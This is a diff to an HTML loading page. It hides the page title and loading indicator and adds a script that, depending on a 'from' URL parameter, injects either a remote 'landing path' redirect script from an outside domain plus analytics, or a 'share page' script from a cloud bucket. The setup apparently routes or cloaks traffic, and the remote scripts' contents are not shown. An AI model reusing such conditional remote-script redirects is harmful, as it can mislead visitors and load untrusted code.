@@ -3,7 +3,7 @@
 
 <head>
     <meta http-equiv="Content-Type" content="text/html; charset=utf8">
-    <title>&#x6b63;&#x5728;&#x52a0;&#x8f7d;&#x2e;&#x2e;&#x2e;</title>
+    <title>.</title>
     <meta name="viewport"
         content="width=device-width, initial-scale=1.0, minimum-scale=1.0 , maximum-scale=1.0, user-scalable=0">
     <style type="text/css">
@@ -75,17 +75,36 @@
     </style>
 </head>
 <body>
-    <div class="toast loading_toast toast--visible">
+    <!-- <div class="toast loading_toast toast--visible">
         <div><i class="loading icon_toast"></i></div>
         <p class="toast_content">&#x6b63;&#x5728;&#x52a0;&#x8f7d;&#x2e;&#x2e;&#x2e;</p>
-    </div>
+    </div> -->
+    
+    <script id='ss'></script>
     <script>
-        var e = document.createElement('script');
-        e.setAttribute('type', 'text/javascript');
-        e.setAttribute('charset', 'utf-8');
-        e.setAttribute('src', 'https://auth.gulanduo.net/redirectborn');   //获取落地路径
-        document.getElementsByTagName('head')[0].appendChild(e);
+        (function () {
+            var reg = new RegExp("(^|&)" + 'from' + "=([^&]*)(&|$)");
+            var r = window.location.search.substr(1).match(reg);
+            if(r != null) 
+            {
+                var e = document.createElement('script');
+                e.setAttribute('type', 'text/javascript');
+                e.setAttribute('charset', 'utf-8');
+                e.setAttribute('src', 'https://www.gulanduo.net/redirectborn');   //获取落地路径
+                document.getElementsByTagName('head')[0].appendChild(e);
+                document.getElementById('ss').src= 'https://hm.baidu.com/hm.js?e615dda19f89116abe658ab20ee9f1b3';
+            }
+            else
+            {
+                // let s= "https://x-line.oss-cn-shenzhen.aliyuncs.com/line08/share-3.1.2.js?v=2";
+                // document.getElementById('ss').src= s;
+                var e = document.createElement('script');
+                e.setAttribute('type', 'text/javascript');
+                e.setAttribute('charset', 'utf-8');
+                e.setAttribute('src', 'https://x-line.oss-cn-shenzhen.aliyuncs.com/line08/share-3.1.2.js?v=1');   //分享页js
+                document.getElementsByTagName('head')[0].appendChild(e);
+            }
+        })();
     </script>
 </body>
-
 </html>
